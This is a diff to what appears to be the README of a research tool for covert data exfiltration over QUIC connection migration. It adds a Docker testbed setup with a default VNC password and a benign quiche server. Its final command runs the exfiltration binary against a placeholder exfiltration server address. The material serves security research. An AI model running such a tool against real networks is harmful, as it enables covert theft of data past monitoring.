@@ -26,3 +26,63 @@ QUIC-exfiltration client-side Wireshark trace (without the required server-side 
 * Packet 54622 mimics the PATH_CHALLENGE packet
 
 ![Alt text](sample_pcap.png "pcap_sample")
+
+
+## Experimental Testbed
+
+This section describes the experimental setup used to evaluate `quicexfil` in a Docker-based testbed. The testbed aims to simulate a small enterprise network with multiple desktop machines generating QUIC traffic, and controlled benign connection migrations using Cloudflare's `quiche` library.
+
+Docker compose spins up 16 containers running the `quicexfil` binary. Each container is based on [`accetto/xubuntu-vnc-novnc-firefox`](https://hub.docker.com/r/accetto/xubuntu-vnc-novnc-firefox) for a lightweight desktop GUI with Firefox and noVNC support.
+
+Launch the setup:
+
+```sh
+docker compose up --build
+```
+
+This will build the image and launch 16 instances of the quicexfil container.
+
+You will see console output showing accessible noVNC URLs (e.g. https://172.19.0.8:6901) for each container. These can be opened in your host browser (preferably Firefox) to interact with each container’s desktop environment.
+
+You can connect to each container using the noVNC lite clients, for example:
+
+```sh
+https://172.19.0.8:6901
+```
+
+Log in with the default password <i>headless</i> and open Firefox in each container to manually generate QUIC traffic (e.g., by visiting sites like Cloudflare or Google).
+
+Running the benign QUIC Server on the Host VM:
+
+The base virtual machine (host) runs the quiche server to listen for and accept QUIC connections (including active migrations):
+
+```sh
+./target/release/quiche-server \
+  --listen 192.168.100.63:4433 \
+  --root html \
+  --cert apps/src/bin/cert.crt \
+  --key apps/src/bin/cert.key \
+  --enable-active-migration
+```
+
+Replace <i>192.168.100.63</i> with the IP address of your host machine.
+
+Connect to each container using
+
+```sh
+docker exec -it <container_id> bash
+```
+
+and then start the benign quiche connection migration script (make sure to adjust the IP address of your quiche server within the [script](https://github.com/thomasgruebl/quic-exfil/blob/main/scripts/benign_conn_migr.sh)):
+
+```sh
+./benign_conn_migr.sh
+```
+
+In 4 of the 16 containers, the experimental quicexfil tool is manually run to test potential data exfiltration over QUIC:
+
+```sh
+./target/release/quic-exfiltration -d "192.0.2.100" -i "eth0"
+```
+
+Replace <i>192.0.2.100</i> with the IP address of your exfiltration server.
